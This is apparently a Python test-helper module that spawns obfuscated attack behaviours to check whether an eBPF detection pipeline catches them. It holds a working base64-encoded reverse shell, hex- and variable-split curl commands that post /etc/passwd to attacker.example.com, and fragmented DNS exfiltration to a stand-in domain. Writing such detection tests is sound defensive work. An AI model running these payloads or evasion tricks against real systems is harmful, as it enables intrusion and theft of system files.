"""Encoding/obfuscation attack generators (issue #30).

Every rule-engine test in tests/rules/ injects a payload as a readable
string (comm/proc_args match literal binary names or substrings). None of
them check what happens once an attacker encodes or fragments the payload
before it reaches the kernel — a standard technique for evading regex/
contains matching on command lines and DNS query names.

These generators spawn real processes so the resulting behaviour can be
observed through the same eBPF -> daemon -> rule -> alert pipeline as every
other integration test in this directory, rather than assumed.
"""

import base64
import subprocess


def base64_reverse_shell(host: str = "127.0.0.1", port: int = 4444) -> subprocess.Popen:
    """`echo <base64> | base64 -d | python3` — hides the reverse-shell source
    from anything that pattern-matches the shell's own command line. The
    eventual `connect()` syscall is unobfuscated: the encoding only hides
    the *source text*, not the resulting network event."""
    payload = (
        f"import socket,os,pty; s=socket.socket(); s.connect(('{host}',{port})); "
        f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); pty.spawn('/bin/bash')"
    )
    b64 = base64.b64encode(payload.encode()).decode()
    return subprocess.Popen(
        ["bash", "-c", f"echo {b64} | base64 -d | python3"],
        stderr=subprocess.DEVNULL,
    )


def hex_encoded_curl_exfil(target: str = "http://attacker.example.com") -> subprocess.Popen:
    """Builds the literal string "curl" via `$(printf '\\x63\\x75...')` so a
    naive string match on the shell's proc_args for "curl" never sees it.
    bash still fully expands command substitution before calling execve(),
    so the kernel-level exec event carries argv[0] == "curl" regardless."""
    hex_curl = "".join(f"\\x{b:02x}" for b in b"curl")
    cmd = f"$(printf '{hex_curl}') -s -X POST {target} --data @/etc/passwd --max-time 2"
    return subprocess.Popen(["bash", "-c", cmd], stderr=subprocess.DEVNULL)


def env_var_split_command(target: str = "http://attacker.example.com") -> subprocess.Popen:
    """Assembles "curl" from two environment variables (A=cu; B=rl; $A$B ...)
    instead of a literal binary name — a common obfuscation seen in shell
    droppers to defeat static string scanning of scripts."""
    cmd = f"A=cu; B=rl; $A$B -s -X POST {target} --data @/etc/passwd --max-time 2"
    return subprocess.Popen(["bash", "-c", cmd], stderr=subprocess.DEVNULL)


def fragmented_dns_exfil(
    domain_suffix: str = "exfil.evil.io",
    data: str = "secretdata" * 20,
    chunk_size: int = 20,
) -> subprocess.Popen:
    """Splits plaintext (not base64/hex) data across many short DNS labels
    instead of one long, high-entropy qname — tests whether per-label
    entropy/DGA scoring is defeated when the exfiltrated data itself isn't
    random-looking."""
    code = f"""
import socket
data = {data!r}
suffix = {domain_suffix!r}
chunk_size = {chunk_size}
for i in range(0, len(data), chunk_size):
    chunk = data[i:i + chunk_size]
    qname = f"{{chunk}}.{{i // chunk_size}}.{{suffix}}"
    try:
        socket.getaddrinfo(qname, None)
    except socket.gaierror:
        pass
"""
    return subprocess.Popen(["python3", "-c", code], stderr=subprocess.DEVNULL)


def dga_style_dns_beacon(domain_suffix: str = "exfil.evil.io") -> subprocess.Popen:
    """Negative control for fragmented_dns_exfil: a single query whose
    leading label is genuinely random-looking (high entropy, digit-heavy),
    the kind of qname the entropy/DGA rule is meant to catch."""
    code = f"""
import socket
try:
    socket.getaddrinfo("a8f3c9d21b.{domain_suffix}", None)
except socket.gaierror:
    pass
"""
    return subprocess.Popen(["python3", "-c", code], stderr=subprocess.DEVNULL)
